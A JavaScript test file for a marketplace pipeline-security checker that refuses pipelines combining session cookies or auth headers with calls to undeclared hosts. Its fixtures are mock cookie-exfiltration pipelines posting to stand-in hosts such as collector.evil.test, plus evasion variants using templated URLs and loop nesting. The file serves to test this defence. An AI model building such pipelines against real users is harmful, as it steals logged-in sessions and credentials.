// A pipeline from a stranger is a program, not a document.
//
// The marketplace makes that concrete: an Install button on a website is an
// invitation to run someone else's code against pages you are logged into. The
// registry already knew — `SESSION` in utils/step-types.js carries the note
// that a shared pipeline should not "carry someone's cookies out with it" —
// and this is the enforcement that sentence was waiting for.
//
// The tests are split the way the module is: what it *describes*, and the one
// thing it *refuses*. The refusal is the part worth being strict about, so
// most of what follows is attempts to sneak past it.
import test from "node:test";
import assert from "node:assert/strict";

import {
  analyzePipeline,
  summarizeCapabilities,
  originOf,
  walkSteps,
  SEVERITY,
  VERDICT,
} from "../utils/pipeline-capabilities.js";

const site = (url) => ({ id: "w", type: "WEBSITE", config: { url } });

// ── Reading the pipeline at all ──────────────────────────────────────────────

test("steps nested in loops and branches are not missed", () => {
  // The whole check is worthless if hiding the SESSION step one level down
  // defeats it, and "inside a LOOP" is where a real pipeline puts things.
  const found = walkSteps([
    { id: "a", type: "LOOP", children: [{ id: "b", type: "SESSION" }] },
    {
      id: "c",
      type: "IF_ELSE",
      ifBranch: [{ id: "d", type: "API" }],
      elseBranch: [{ id: "e", type: "SET_HEADERS" }],
    },
  ]);
  assert.deepEqual(
    found.map((s) => s.id),
    ["a", "b", "c", "d", "e"],
  );
});

test("a templated host cannot be resolved and says so", () => {
  // This is the attacker's lever: if an unresolvable URL were waved through,
  // every check below could be bypassed by writing {{x}} instead of a domain.
  assert.deepEqual(originOf("{{item.href}}"), { unknown: true });
  assert.deepEqual(originOf("https://{{host}}/path"), { unknown: true });
  assert.deepEqual(originOf("not a url"), { unknown: true });
  assert.deepEqual(originOf(""), { unknown: true });
});

test("a template in the path still leaves a knowable origin", () => {
  // The common legitimate shape. Treating it as unknown would make the gate
  // fire on ordinary pipelines, and a gate that fires on everything is one
  // people learn to click through.
  assert.deepEqual(originOf("https://api.site.com/v1/{{item.id}}"), {
    origin: "https://api.site.com",
  });
});

// ── Describing what it can do ────────────────────────────────────────────────

test("a plain scraper needs no decision from anybody", () => {
  const analysis = analyzePipeline({
    steps: [
      site("https://shop.test/products"),
      { id: "e", type: "EXTRACT", config: { fields: [] } },
    ],
  });
  assert.equal(analysis.verdict, VERDICT.ALLOW);
});

test("an export alone does not manufacture a warning", () => {
  // EXPORT is informational. If it pushed the verdict to review, the most
  // ordinary pipeline in the product would show a consent dialog, and the
  // dialog would stop meaning anything.
  const analysis = analyzePipeline({
    steps: [site("https://shop.test"), { id: "x", type: "EXPORT", config: {} }],
  });
  assert.equal(analysis.verdict, VERDICT.ALLOW);
});

test("cookie access is reported in words, not step types", () => {
  const analysis = analyzePipeline({
    steps: [
      site("https://shop.test"),
      { id: "s", type: "SESSION", config: { includeCookies: true } },
    ],
  });
  const cap = analysis.capabilities.find((c) => c.id === "credentials");
  assert.ok(cap, "cookie access should be reported");
  assert.equal(cap.severity, SEVERITY.DANGER);
  // Nobody consents to the string "SESSION".
  assert.match(cap.title, /logged-in session/i);
});

test("an API call to the site being scraped is not treated as off-site", () => {
  const analysis = analyzePipeline({
    steps: [
      site("https://shop.test/products"),
      { id: "a", type: "API", config: { url: "https://shop.test/api/items" } },
    ],
  });
  assert.deepEqual(analysis.thirdPartyOrigins, []);
  assert.equal(analysis.verdict, VERDICT.REVIEW);
});

test("header names are reported and header values never are", () => {
  // The rule the PII detector holds to: a warning about a secret must not
  // repeat the secret.
  const analysis = analyzePipeline({
    steps: [
      site("https://shop.test"),
      {
        id: "h",
        type: "SET_HEADERS",
        config: {
          headers: JSON.stringify({ Authorization: "Bearer hunter2-SECRET" }),
        },
      },
    ],
  });
  const text = JSON.stringify(analysis);
  assert.match(text, /Authorization/);
  assert.ok(!text.includes("hunter2-SECRET"), "the token is in the report");
});

// ── The one thing it refuses ─────────────────────────────────────────────────

test("cookies plus an undeclared destination is refused, not warned about", () => {
  // The attack this whole module exists for: a plausible scraper that also
  // ships your session somewhere else.
  const analysis = analyzePipeline({
    name: "Amazon Product Scraper",
    steps: [
      site("https://amazon.test/products"),
      { id: "s", type: "SESSION", config: { includeCookies: true } },
      {
        id: "a",
        type: "API",
        config: { url: "https://collector.evil.test/ingest", method: "POST" },
      },
    ],
  });
  assert.equal(analysis.verdict, VERDICT.BLOCKED);
  assert.match(analysis.blockedReason, /collector\.evil\.test/);
});

test("a templated destination cannot launder the same attack", () => {
  // If unknown resolved to "fine", writing {{c2}} instead of the domain would
  // walk straight through the check above.
  const analysis = analyzePipeline({
    steps: [
      site("https://amazon.test"),
      { id: "s", type: "SESSION", config: { includeCookies: true } },
      { id: "a", type: "API", config: { url: "{{item.callback}}" } },
    ],
  });
  assert.equal(analysis.verdict, VERDICT.BLOCKED);
});

test("hiding the exfil step inside a loop does not help", () => {
  const analysis = analyzePipeline({
    steps: [
      site("https://amazon.test"),
      { id: "s", type: "SESSION", config: { includeCookies: true } },
      {
        id: "l",
        type: "LOOP",
        config: {},
        children: [
          { id: "a", type: "API", config: { url: "https://evil.test/x" } },
        ],
      },
    ],
  });
  assert.equal(analysis.verdict, VERDICT.BLOCKED);
});

test("an auth header plus an off-site call is the same attack", () => {
  // Credentials do not have to come from SESSION. A hardcoded bearer token
  // being posted to a third party is the same event.
  const analysis = analyzePipeline({
    steps: [
      site("https://shop.test"),
      {
        id: "h",
        type: "SET_HEADERS",
        config: { headers: "Authorization: Bearer abc" },
      },
      { id: "a", type: "API", config: { url: "https://evil.test/x" } },
    ],
  });
  assert.equal(analysis.verdict, VERDICT.BLOCKED);
});

test("cookies alone are allowed through with a warning", () => {
  // The refusal has to stay narrow. A login-walled scraper is a real and
  // legitimate thing, and blocking it would make the gate wrong rather than
  // strict.
  const analysis = analyzePipeline({
    steps: [
      site("https://shop.test/login"),
      { id: "s", type: "SESSION", config: { includeCookies: true } },
      { id: "e", type: "EXTRACT", config: {} },
    ],
  });
  assert.equal(analysis.verdict, VERDICT.REVIEW);
  assert.equal(analysis.blockedReason, null);
});

test("a third-party call alone is allowed through with a warning", () => {
  // Enriching rows from a public API is legitimate. It is only the pairing
  // with credentials that has no innocent version.
  const analysis = analyzePipeline({
    steps: [
      site("https://shop.test"),
      { id: "a", type: "API", config: { url: "https://api.public.test/x" } },
    ],
  });
  assert.equal(analysis.verdict, VERDICT.REVIEW);
  assert.equal(analysis.blockedReason, null);
});

test("a pipeline that declares no site at all cannot smuggle credentials", () => {
  // With nothing declared there is no such thing as first-party, so every
  // destination is undeclared. Failing open here would make the check optional
  // simply by omitting the WEBSITE step.
  const analysis = analyzePipeline({
    steps: [
      { id: "s", type: "SESSION", config: { includeCookies: true } },
      { id: "a", type: "API", config: { url: "https://evil.test/x" } },
    ],
  });
  assert.equal(analysis.verdict, VERDICT.BLOCKED);
});

// ── The summary line ─────────────────────────────────────────────────────────

test("the card summary leads with what is dangerous", () => {
  const analysis = analyzePipeline({
    steps: [
      site("https://shop.test"),
      { id: "s", type: "SESSION", config: { includeCookies: true } },
      { id: "x", type: "EXPORT", config: {} },
    ],
  });
  const line = summarizeCapabilities(analysis);
  assert.match(line, /logged-in session/i);
  assert.ok(
    !/Writes the collected rows/.test(line),
    "buried the dangerous one",
  );
});

test("a refused pipeline summarises as refused wherever it is rendered", () => {
  assert.match(
    summarizeCapabilities({ verdict: VERDICT.BLOCKED, capabilities: [] }),
    /refused/i,
  );
});
